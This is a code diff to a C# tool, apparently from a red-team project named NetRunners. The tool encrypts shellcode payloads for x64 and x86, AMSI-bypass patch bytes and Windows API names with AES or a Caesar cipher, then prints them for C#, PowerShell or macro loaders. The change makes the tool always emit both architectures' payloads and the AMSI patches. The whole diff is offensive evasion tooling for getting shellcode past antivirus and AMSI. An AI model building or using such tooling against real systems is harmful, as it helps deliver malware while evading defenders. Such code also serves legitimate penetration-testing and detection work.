@@ -15,8 +15,6 @@ namespace NetRunners.Encryptor
         public bool macro { get; set; }
         [Option('p', "powershell", Required = false, HelpText = "Print payload, aes key and iv in powershell format.")]
         public bool powershell { get; set; }
-        [Option("x86", Required = false, HelpText = "Print x86 encrypted payload.")]
-        public bool x86 { get; set; }
     }
     /// <summary>
     /// Entry point Encryptor, checks for arguments, prints decryption key and encrypted data.
@@ -38,9 +36,6 @@ namespace NetRunners.Encryptor
             byte[] AesKey = GenerateKey_Aes();
             //byte[] XorKey = new byte[4];
 
-            // Choose the correct payload based on the x86 argument
-            buf = opts.x86 ? buf86 : buf;
-
             if (opts.macro)
             {
                 // generate random caesar substitution key
@@ -50,9 +45,16 @@ namespace NetRunners.Encryptor
                 // print substitution key
                 Console.WriteLine($"key = {CaesarKey}");
 
+                // print x64 buf
                 encrypted = EncryptBytesToBytes_Caesar(buf, CaesarKey);
                 Console.Write($"buf = ");
                 PrintBytesToDec(encrypted);
+
+                // print x86 buf
+                encrypted = EncryptBytesToBytes_Caesar(buf86, CaesarKey);
+                Console.Write($"buf86 = ");
+                PrintBytesToDec(encrypted);
+
                 return;
             }
             else if (opts.powershell)
@@ -70,13 +72,28 @@ namespace NetRunners.Encryptor
                 Console.Write("[Byte[]] $buf = ");
                 PrintBytesToHexPs(encrypted);
 
-                // encrypt and print all strings
+                // encrypt buf86 and print
+                encrypted = EncryptBytesToBytes_Aes(buf86, AesKey, AesIV);
+                Console.Write("[Byte[]] $buf86 = ");
+                PrintBytesToHexPs(encrypted);
+
+                // encrypt amsipatch and print
+                encrypted = EncryptBytesToBytes_Aes(AmsiPatch, AesKey, AesIV);
+                Console.Write("[Byte[]] $AmsiPatch = ");
+                PrintBytesToHexPs(encrypted);
+
+                // encrypt amsipatch86 and print
+                encrypted = EncryptBytesToBytes_Aes(AmsiPatch86, AesKey, AesIV);
+                Console.Write("[Byte[]] $AmsiPatch86 = ");
+                PrintBytesToHexPs(encrypted);
+
+                // encrypt and print all api strings
                 for (int i = 0; i < FunctionNames.Length; i++)
                 {
                     byte[] FunctionNameBytes = Encoding.UTF8.GetBytes(FunctionNames[i]);
                     encrypted = EncryptBytesToBytes_Aes(FunctionNameBytes, AesKey, AesIV);
                     Console.Write($"[Byte[]] ${FunctionNames[i].Replace(".", "")}_Byte = ");
-                    PrintBytesToHex(encrypted);
+                    PrintBytesToHexPs(encrypted);
                 }
                 return;
             }
@@ -94,9 +111,29 @@ namespace NetRunners.Encryptor
                 encrypted = EncryptBytesToBytes_Aes(buf, AesKey, AesIV);
                 Console.Write("public static byte[] buf = ");
                 PrintBytesToHex(encrypted);
+
+                // encrypt buf86 and print
+                encrypted = EncryptBytesToBytes_Aes(buf86, AesKey, AesIV);
+                Console.Write("public static byte[] buf86 = ");
+                PrintBytesToHex(encrypted);
+
                 // print decrypted buf size
                 Console.Write($"public static int sBuf = ");
                 Console.WriteLine($"{buf.Length};");
+
+                // print decrypted buf86 size
+                Console.Write($"public static int sBuf86 = ");
+                Console.WriteLine($"{buf86.Length};");
+
+                // encrypt amsipatch and print
+                encrypted = EncryptBytesToBytes_Aes(AmsiPatch, AesKey, AesIV);
+                Console.Write("public static byte[] AmsiPatch = ");
+                PrintBytesToHex(encrypted);
+
+                // encrypt amsipatch86 and print
+                encrypted = EncryptBytesToBytes_Aes(AmsiPatch86, AesKey, AesIV);
+                Console.Write("public static byte[] AmsiPatch86 = ");
+                PrintBytesToHex(encrypted);
 
                 // encrypt and print all strings
                 for (int i = 0; i < FunctionNames.Length; i++)
